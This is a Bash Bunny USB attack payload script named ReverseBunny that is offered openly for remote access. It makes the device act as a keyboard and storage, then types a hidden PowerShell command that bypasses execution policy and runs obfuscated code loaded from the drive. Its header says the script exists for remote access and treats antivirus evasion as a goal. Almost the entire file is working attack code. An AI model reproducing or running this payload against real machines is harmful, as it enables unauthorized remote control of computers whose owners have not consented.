#!/bin/bash
#
# Title:         ReverseBunny
# Description:   Get remote access using obfuscated powershell code - If caught by AV, feel free to contact me.
# Author:        0iphor13
# Version:       1.1
# Category:      Remote_Access
# Attackmodes:   HID, Storage

LED SETUP

GET SWITCH_POSITION

rm /root/udisk/DONE

ATTACKMODE HID STORAGE

#LED STAGE1 - DON'T EJECT - PAYLOAD RUNNING

LED STAGE1

RUN WIN "powershell -NoP -NonI -W hidden -Exec Bypass \"iex((gc((gwmi win32_volume -f 'label=''BashBunny''').Name+'\payloads\\$SWITCH_POSITION\ReverseBunny.txt')))\""

LED STAGE2

until  [ -f /root/udisk/DONE ]
	do
	sleep 0.2
done

LED CLEANUP

rm /root/udisk/DONE

DELAY 100

sync

DELAY 100

LED FINISH

#SAVE TO EJECT
